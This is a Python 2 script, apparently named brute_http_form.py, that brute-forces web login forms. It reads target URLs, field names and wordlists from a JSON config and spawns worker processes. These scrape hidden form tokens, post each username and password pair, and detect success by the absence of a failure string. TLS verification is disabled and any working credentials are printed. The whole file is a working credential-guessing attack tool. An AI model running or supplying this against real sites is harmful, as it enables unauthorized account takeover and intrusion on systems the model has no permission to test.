


import requests
import multiprocessing
import sys
import Queue
import re
import json
import HTMLParser
import time

VERIFY = False

if VERIFY is False:
    requests.packages.urllib3.disable_warnings()


# Class to parse HTML responses to find the needed hidden fields and to test
# for login success or failure.
class bruteParser(HTMLParser.HTMLParser):
    def __init__(self, fail, hidden_fields):
        HTMLParser.HTMLParser.__init__(self)
        self.hidden = {}
        self.hidden_fields = hidden_fields
        self.fail_regex = fail
        self.fail = False

    def feed(self, data):
        # Reset our fail flag before we process any data
        self.fail = False
        HTMLParser.HTMLParser.feed(self, data)

    def handle_starttag(self, tag, attr):
        if tag == 'input':
            attribs = dict(attr)
            if attribs['type'] == 'hidden':
                if attribs['name'] in self.hidden_fields:
                    self.hidden[attribs['name']] = attribs['value']

    def handle_data(self, data):
        m = self.fail_regex.search(data)

        # If we have a match, m is not None, on the fail_str then the login
        # attempt was unsuccessful.
        if m is not None:
            self.fail = True


def load_config(f):
    return json.loads(open(f).read())


def worker(login, action, parser, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    sess = requests.Session()
    resp = sess.get(login, verify=VERIFY)
    parser.feed(resp.content)

    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = {config['ufield']: creds[0],
                config['pfield']: creds[1]}
        auth.update(parser.hidden)
        resp = sess.post(action, data=auth, verify=VERIFY)
        parser.feed(resp.content)

        if parser.fail is True:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return

        time.sleep(config['wait'])


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'USAGE: brute_http_form.py config_file'
        sys.exit()

    config = load_config(sys.argv[1])

    fail = re.compile(config['fail_str'], re.I | re.M)
    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(config['threads']):
        p = multiprocessing.Process(target=worker,
                                    args=(config['login'],
                                          config['action'],
                                          bruteParser(fail, config['hidden']),
                                          cred_queue,
                                          success_queue))
        procs.append(p)
        p.start()

    for user in open(config['ufile']):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(config['pfile']):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)
